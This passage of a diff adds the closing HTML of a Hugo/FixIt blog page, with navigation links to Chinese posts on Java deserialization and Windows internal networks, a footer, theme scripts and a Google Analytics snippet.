+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9/" class="post-nav-item" rel="prev" title="Java反序列化基础"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Java反序列化基础</a>
+      <a href="/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/53/" class="post-nav-item" rel="next" title="Windows内网知识大纲">Windows内网知识大纲<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
